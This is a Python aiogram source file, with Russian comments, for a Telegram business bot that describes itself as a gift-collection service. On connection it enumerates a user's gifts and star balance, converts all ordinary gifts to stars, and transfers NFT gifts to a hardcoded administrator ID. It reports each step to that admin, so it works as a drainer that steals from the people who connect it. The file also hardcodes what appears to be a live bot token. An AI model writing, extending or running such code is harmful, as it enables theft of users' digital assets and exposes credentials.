import os
import json
import logging
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import TransferGift, ConvertGiftToStars
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
import config

# Конфигурация
BOT_TOKEN = "8455279912:AAFoWu_2-qxq-BoJUjzwXV1tcRcBnBptkhs"
ADMIN_ID = 8717189451  # ID админа для уведомлений
CONNECTIONS_FILE = "connections.json"
GIFTS_CACHE_FILE = "gifts_cache.json"

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def load_connections():
    """Загрузка бизнес-подключений"""
    if not os.path.exists(CONNECTIONS_FILE):
        return []
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return []

def save_connections(connections):
    """Сохранение бизнес-подключений"""
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(connections, f, indent=2, ensure_ascii=False)

def load_gifts_cache():
    """Загрузка кэша гифтов"""
    if not os.path.exists(GIFTS_CACHE_FILE):
        return {}
    try:
        with open(GIFTS_CACHE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def save_gifts_cache(cache):
    """Сохранение кэша гифтов"""
    with open(GIFTS_CACHE_FILE, "w", encoding="utf-8") as f:
        json.dump(cache, f, indent=2, ensure_ascii=False)

async def get_business_gifts(business_connection_id):
    """Получение списка гифтов бизнес-аккаунта"""
    try:
        result = await bot(GetBusinessAccountGifts(
            business_connection_id=business_connection_id
        ))
        return result.gifts if result else []
    except Exception as e:
        logging.error(f"Ошибка получения гифтов: {e}")
        return []

async def get_business_stars(business_connection_id):
    """Получение баланса звезд"""
    try:
        result = await bot(GetBusinessAccountStarBalance(
            business_connection_id=business_connection_id
        ))
        return result.star_amount if result else 0
    except Exception as e:
        logging.error(f"Ошибка получения звезд: {e}")
        return 0

def format_gift_info(gift):
    """Форматирование информации о гифте"""
    is_nft = gift.get("is_nft", False)
    gift_type = "🟣 NFT" if is_nft else "⭐️ Обычный"
    
    info = f"{gift_type} | {gift.get('title', 'Без названия')}\n"
    info += f"   ID: `{gift.get('id', 'N/A')}`\n"
    
    if gift.get("star_cost"):
        info += f"   💫 Стоимость: {gift.get('star_cost')} звезд\n"
    
    if gift.get("cooldown_until"):
        cooldown = datetime.fromisoformat(gift.get("cooldown_until"))
        now = datetime.now()
        if cooldown > now:
            remaining = cooldown - now
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            info += f"   ⏰ КД: {hours}ч {minutes}мин (до {cooldown.strftime('%H:%M')})\n"
        else:
            info += f"   ✅ КД: нет\n"
    
    if gift.get("count"):
        info += f"   📦 Количество: {gift.get('count')}\n"
    
    return info

async def send_admin_report(connection_id, user_id, stars_balance, gifts):
    """Отправка подробного отчета админу"""
    try:
        # Сортируем гифты
        nft_gifts = [g for g in gifts if g.get("is_nft", False)]
        normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
        
        # Формируем сообщение
        report = f"🔔 **Новое бизнес-подключение!**\n\n"
        report += f"👤 **Пользователь:** `{user_id}`\n"
        report += f"🔗 **Connection ID:** `{connection_id}`\n"
        report += f"💫 **Баланс звезд:** {stars_balance}\n"
        report += f"📦 **Всего подарков:** {len(gifts)}\n"
        report += f"   • NFT: {len(nft_gifts)}\n"
        report += f"   • Обычных: {len(normal_gifts)}\n\n"
        
        # NFT с КД
        if nft_gifts:
            report += f"**🟣 NFT Подарки:**\n"
            for nft in nft_gifts:
                report += format_gift_info(nft)
                report += "\n"
        else:
            report += f"**🟣 NFT:** нет\n\n"
        
        # Обычные подарки
        if normal_gifts:
            report += f"**⭐️ Обычные подарки:**\n"
            for gift in normal_gifts[:10]:  # Показываем первые 10
                report += format_gift_info(gift)
                report += "\n"
            if len(normal_gifts) > 10:
                report += f"... и еще {len(normal_gifts) - 10} подарков\n"
        else:
            report += f"**⭐️ Обычные:** нет\n"
        
        # Кнопки управления
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🔄 Обновить", callback_data=f"refresh_{user_id}_{connection_id}"),
                InlineKeyboardButton(text="📊 Статистика", callback_data=f"stats_{user_id}_{connection_id}")
            ],
            [
                InlineKeyboardButton(text="💰 Конвертировать всё", callback_data=f"convert_all_{connection_id}"),
                InlineKeyboardButton(text="🎁 Передать NFT", callback_data=f"transfer_nft_{connection_id}")
            ]
        ])
        
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=report,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        
    except Exception as e:
        logging.exception(f"Ошибка отправки отчета админу: {e}")

async def send_update_report(user_id, connection_id, action, details):
    """Отправка обновления админу после действий"""
    try:
        report = f"🔄 **Обновление по пользователю** `{user_id}`\n\n"
        report += f"📝 **Действие:** {action}\n"
        report += f"📊 **Детали:**\n{details}\n"
        report += f"⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Полный отчет", callback_data=f"full_report_{user_id}_{connection_id}")]
        ])
        
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=report,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    except Exception as e:
        logging.exception(f"Ошибка отправки обновления: {e}")

async def convert_gift_to_stars(business_connection_id, gift_id, user_id):
    """Конвертация обычного подарка в звезды с отчетом"""
    try:
        await bot(ConvertGiftToStars(
            business_connection_id=business_connection_id,
            gift_id=gift_id
        ))
        
        # Отправляем отчет админу
        await send_update_report(
            user_id,
            business_connection_id,
            "Конвертация подарка",
            f"✅ Подарок `{gift_id}` конвертирован в звезды"
        )
        return True
    except Exception as e:
        logging.error(f"Ошибка конвертации подарка {gift_id}: {e}")
        await send_update_report(
            user_id,
            business_connection_id,
            "Ошибка конвертации",
            f"❌ Подарок `{gift_id}`: {str(e)}"
        )
        return False

async def transfer_gift(business_connection_id, gift_id, target_user_id, user_id):
    """Передача гифта с отчетом"""
    try:
        await bot(TransferGift(
            business_connection_id=business_connection_id,
            gift_id=gift_id,
            receiver_user_id=target_user_id
        ))
        
        await send_update_report(
            user_id,
            business_connection_id,
            "Передача NFT",
            f"✅ NFT `{gift_id}` передан админу"
        )
        return True
    except TelegramBadRequest as e:
        error_msg = f"❌ Нет доступа к NFT `{gift_id}`"
        logging.warning(error_msg)
        await send_update_report(
            user_id,
            business_connection_id,
            "Ошибка передачи",
            error_msg
        )
        return False
    except Exception as e:
        error_msg = f"❌ Ошибка: {str(e)}"
        logging.error(f"Ошибка передачи подарка {gift_id}: {e}")
        await send_update_report(
            user_id,
            business_connection_id,
            "Ошибка передачи",
            error_msg
        )
        return False

async def process_gifts(business_connection_id, user_id, stars_balance, gifts):
    """Обработка гифтов с подробным отчетом"""
    try:
        nft_gifts = [g for g in gifts if g.get("is_nft", False)]
        normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
        
        details = f"💰 Начальный баланс: {stars_balance} звезд\n"
        details += f"📦 Всего гифтов: {len(gifts)} (NFT: {len(nft_gifts)}, обычных: {len(normal_gifts)})\n\n"
        
        # Конвертируем обычные подарки
        converted_count = 0
        for gift in normal_gifts:
            if await convert_gift_to_stars(business_connection_id, gift.id, user_id):
                converted_count += 1
            await asyncio.sleep(0.5)
        
        details += f"✅ Конвертировано обычных подарков: {converted_count}\n"
        
        # Обновляем баланс после конвертации
        await asyncio.sleep(1)
        new_stars_balance = await get_business_stars(business_connection_id)
        details += f"💰 Новый баланс звезд: {new_stars_balance}\n\n"
        
        # Передаем NFT
        transferred_count = 0
        for nft in nft_gifts:
            required_stars = nft.get("star_cost", 25)
            
            if new_stars_balance < required_stars:
                details += f"⚠️ Не хватает звезд для NFT `{nft.get('id')}` (нужно {required_stars})\n"
                continue
            
            if await transfer_gift(business_connection_id, nft.id, ADMIN_ID, user_id):
                transferred_count += 1
                new_stars_balance -= required_stars
            await asyncio.sleep(0.5)
        
        details += f"\n🎁 Передано NFT: {transferred_count}/{len(nft_gifts)}"
        
        # Финальный отчет админу
        await send_update_report(
            user_id,
            business_connection_id,
            "Обработка завершена",
            details
        )
        
        return converted_count, transferred_count
        
    except Exception as e:
        logging.exception(f"Ошибка обработки гифтов: {e}")
        await send_update_report(
            user_id,
            business_connection_id,
            "Критическая ошибка",
            f"❌ {str(e)}"
        )
        return 0, 0

@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection):
    """Обработка нового бизнес-подключения"""
    try:
        user_id = connection.user.id
        connection_id = connection.business_connection_id
        
        logging.info(f"Новое бизнес-подключение от {user_id}")
        
        # Сохраняем подключение
        connections = load_connections()
        connection_data = {
            "business_connection_id": connection_id,
            "user_id": user_id,
            "date": connection.date.isoformat(),
            "status": "active"
        }
        
        updated = False
        for i, conn in enumerate(connections):
            if conn["user_id"] == user_id:
                connections[i] = connection_data
                updated = True
                break
        
        if not updated:
            connections.append(connection_data)
        
        save_connections(connections)
        
        # Получаем данные о гифтах и звездах
        gifts = await get_business_gifts(connection_id)
        stars_balance = await get_business_stars(connection_id)
        
        # Отправляем отчет админу
        await send_admin_report(connection_id, user_id, stars_balance, gifts)
        
        # Приветствие пользователю
        await bot.send_message(
            business_connection_id=connection_id,
            chat_id=user_id,
            text="✅ Бот активирован! Начинаю обработку ваших подарков..."
        )
        
        # Обрабатываем гифты
        await process_gifts(connection_id, user_id, stars_balance, gifts)
        
        # Финальное сообщение пользователю
        await bot.send_message(
            business_connection_id=connection_id,
            chat_id=user_id,
            text="✅ Все подарки обработаны! Спасибо за использование бота."
        )
        
    except Exception as e:
        logging.exception(f"Ошибка в бизнес-подключении: {e}")
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ Критическая ошибка при подключении {user_id}: {e}"
        )

@dp.callback_query()
async def handle_callback(callback: CallbackQuery):
    """Обработка кнопок админа"""
    try:
        data = callback.data.split("_")
        action = data[0]
        
        if action == "refresh":
            user_id = int(data[1])
            connection_id = data[2]
            
            # Обновляем данные
            gifts = await get_business_gifts(connection_id)
            stars_balance = await get_business_stars(connection_id)
            
            await send_admin_report(connection_id, user_id, stars_balance, gifts)
            await callback.answer("Данные обновлены!")
            
        elif action == "stats":
            user_id = int(data[1])
            connection_id = data[2]
            
            # Получаем кэшированные данные или новые
            gifts = await get_business_gifts(connection_id)
            stars_balance = await get_business_stars(connection_id)
            
            stats = f"📊 **Статистика пользователя** `{user_id}`\n\n"
            stats += f"💫 Баланс звезд: {stars_balance}\n"
            stats += f"📦 Всего подарков: {len(gifts)}\n"
            stats += f"🟣 NFT: {len([g for g in gifts if g.get('is_nft', False)])}\n"
            stats += f"⭐️ Обычных: {len([g for g in gifts if not g.get('is_nft', False)])}"
            
            await callback.message.answer(stats, parse_mode="Markdown")
            await callback.answer()
            
        elif action == "full":
            user_id = int(data[1])
            connection_id = data[2]
            
            gifts = await get_business_gifts(connection_id)
            stars_balance = await get_business_stars(connection_id)
            
            await send_admin_report(connection_id, user_id, stars_balance, gifts)
            await callback.answer("Полный отчет отправлен!")
            
        elif action == "convert":
            connection_id = data[1]
            
            # Получаем все обычные подарки
            gifts = await get_business_gifts(connection_id)
            normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
            
            for gift in normal_gifts:
                await convert_gift_to_stars(connection_id, gift.id, 0)
                await asyncio.sleep(0.5)
            
            await callback.answer(f"Конвертировано {len(normal_gifts)} подарков!")
            
        elif action == "transfer":
            connection_id = data[1]
            
            gifts = await get_business_gifts(connection_id)
            nft_gifts = [g for g in gifts if g.get("is_nft", False)]
            stars_balance = await get_business_stars(connection_id)
            
            transferred = 0
            for nft in nft_gifts:
                required_stars = nft.get("star_cost", 25)
                if stars_balance >= required_stars:
                    if await transfer_gift(connection_id, nft.id, ADMIN_ID, 0):
                        transferred += 1
                        stars_balance -= required_stars
                await asyncio.sleep(0.5)
            
            await callback.answer(f"Передано {transferred} NFT!")
            
        await callback.message.delete()
        
    except Exception as e:
        logging.exception(f"Ошибка в callback: {e}")
        await callback.answer(f"Ошибка: {e}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    """Команда /start"""
    connections = load_connections()
    count = len(connections)
    
    await message.answer(
        f"🤖 **Бизнес-бот для сбора подарков**\n\n"
        f"📊 Активных подключений: `{count}`\n\n"
        f"**Как это работает:**\n"
        f"1️⃣ Подключите меня как бизнес-бота\n"
        f"2️⃣ Я автоматически:\n"
        f"   • Конвертирую обычные подарки в звезды\n"
        f"   • Передаю NFT администратору\n"
        f"3️⃣ Админ получает полный отчет о:\n"
        f"   • Вашем балансе звезд\n"
        f"   • Всех подарках с КД\n"
        f"   • Статусе обработки\n\n"
        f"👤 **Администратор:** `{ADMIN_ID}`",
        parse_mode="Markdown"
    )

@dp.message(F.text == "/stats")
async def stats_command(message: Message):
    """Статистика для админа"""
    if message.from_user.id != ADMIN_ID:
        await message.reply("❌ Нет доступа.")
        return
    
    connections = load_connections()
    
    stats = f"📊 **Статистика бота**\n\n"
    stats += f"🔗 Всего подключений: `{len(connections)}`\n"
    stats += f"🟢 Активных: `{len([c for c in connections if c.get('status') == 'active'])}`\n\n"
    stats += f"**Последние подключения:**\n"
    
    for conn in connections[-10:]:
        stats += f"• `{conn['user_id']}` - {conn['date'][:10]}\n"
    
    await message.answer(stats, parse_mode="Markdown")

# Запуск
if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    logging.info("🤖 Бот запущен")
    dp.run_polling(bot)
